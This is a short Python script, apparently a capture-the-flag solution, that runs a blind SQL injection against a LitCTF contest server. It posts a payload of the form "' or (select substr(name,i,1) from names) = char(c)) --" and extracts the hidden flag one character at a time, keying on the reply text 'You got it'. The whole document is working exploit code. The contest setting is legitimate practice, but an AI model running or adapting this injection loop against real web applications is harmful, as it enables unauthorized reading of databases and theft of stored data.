import requests

url = 'http://litctf.live:31770/'
flag = ""
for i in range(1, 40):
    for c in range(32, 128):
        payload = "' or (select substr(name,{},1) from names) = char({})) --".format(i, c)
        req = requests.post(url, data={ 'name': payload })
        if "You got it" in req.text:
            flag = flag + chr(c)
            print(flag)
            break

print(flag)